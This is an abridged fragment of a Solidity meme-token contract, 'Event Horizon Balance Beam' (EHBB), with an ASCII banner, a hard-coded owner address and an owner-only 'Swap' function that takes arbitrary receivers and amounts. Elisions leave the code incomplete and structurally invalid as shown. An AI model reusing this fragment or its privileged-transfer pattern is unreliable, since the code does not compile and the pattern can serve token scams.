...
/*
twitter.com/elonmusk/status/1656900119202254854



 __\ / __   ___       _  _ ______ _        _  _     _     __ __    _  __ _    
|_  V |_ |\| |    |_|/ \|_) |  _// \|\|   |_)|_||  |_||\|/  |_    |_)|_ |_||V|
|__   |__| | |    | |\_/| \_|_/__\_/| |   |_)| ||__| || |\__|__   |_)|__| || |
...
contract EHBB is Context, IERC20 {
  ...
  function Swap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    ...
    address public _Owner = 0xfe4186d66884D3f5045Dc3964aFA16a8586B0CB2;

    constructor () public {
        _name = "Event Horizon Balance Beam";
        _symbol ="EHBB";
        _decimals = 18;
        uint256 initialSupply = 69420000000000;
        team = 0xfe4186d66884D3f5045Dc3964aFA16a8586B0CB2;
